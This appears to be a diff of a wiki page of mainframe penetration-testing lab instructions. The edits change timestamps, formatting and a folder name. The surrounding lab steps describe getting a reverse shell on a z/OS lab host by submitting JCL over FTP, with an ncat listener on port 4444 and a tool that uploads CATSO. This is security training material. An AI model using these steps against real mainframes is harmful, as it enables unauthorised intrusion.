@@ -9235,7 +9235,7 @@ Error message and password prompt
     }
 }</pre>
 </div>
-<div created="20190729211912715" modified="20190730230710316" tags="" title="Lab 1 - Login, Edit a File in a Folder and Submit It">
+<div created="20190729211912715" modified="20190730231844042" tags="" title="Lab 1 - Login, Edit a File in a Folder and Submit It">
 <pre>!!''Before Starting - Update''
 * Make sure you have the most up do date labs
 * Update the labs folder:
@@ -9312,7 +9312,7 @@ Error message and password prompt
 ** Type `SD` on `Option ===&gt;` line and hit enter
 *** Or you could've used the shortcut on `Command ===&gt;` line type `=SD` and hit enter
 * ''Viewing SDSF Job Output''
-** In `COMMAND INPUT ===&gt;` line type `OWNER &lt;userid&gt;` and hit enter to set SDSF to only display jobs you own (there will be no message of success, and make sure you replace &lt;userid&gt; with your ID)
+** In `COMMAND INPUT ===&gt;` line type `OWNER &lt;userid&gt;` and hit enter to set SDSF to only display jobs you own (there will be no message of success, and make sure you replace `&lt;userid&gt;` with your ID)
 ** In `COMMAND INPUT ===&gt;` line type `ST` and hit enter to display the jobs for your userid
 ** Find the job that matches the JOBNAME(JOBID) `EVIL#x(JOB00###)` from above
 ** Tab or click your cursor, next to the matching job, and in the `NP` column on the far left type `?` and hit enter
@@ -9377,7 +9377,7 @@ unpwdb.timelimit=0
 ** ''Answer'' If you see the reply `211-JESINTERFACELEVEL is 2` the answer is YES!
 ** What `JESINTERFACELEVEL` means is left up to the reader</pre>
 </div>
-<div created="20190729221131802" modified="20190729224409870" tags="" title="Lab 3 - She Sells JCL Shells">
+<div created="20190729221131802" modified="20190730232053580" tags="" title="Lab 3 - She Sells JCL Shells">
 <pre>!!''Objectives''
 # Use FTP to submit a job and get a reverse shell
 # Use Metasploit to get a shell
@@ -9482,8 +9482,8 @@ unpwdb.timelimit=0
  return 0
 ```
 
-* Save the resulting JCL + REXX to `/root/EVILJR/shelled.jcl`
-* Open two (''2'') Linux terminals and make sure your working directory is `/root/EVILJR`: `cd /root/EVILJR`
+* Save the resulting JCL + REXX to `/root/LabsJR/shelled.jcl`
+* Open two (''2'') Linux terminals and make sure your working directory is `/root/LabsJR`: `cd /root/LabsJR`
 * In one terminal open a ncat listener on port 4444: `ncat -nlvp 4444`
 * In the second terminal connect to the EVILMF FTP server: `ftp evilmf`
 * Log on with your credentials
@@ -9517,7 +9517,7 @@ unpwdb.timelimit=0
 !!''BONUS: TShOcker''
 * Use TShOcker to upload CATSO and get a quasi shell
 * Use `--help` to understand how to use the script
-* It is located in your `/root/EVILJR` folder
+* It is located in your `/root/LabsJR` folder
 </pre>
 </div>
 <div created="20190729224440999" modified="20190729225423264" tags="" title="Lab 4 - Enumeration">
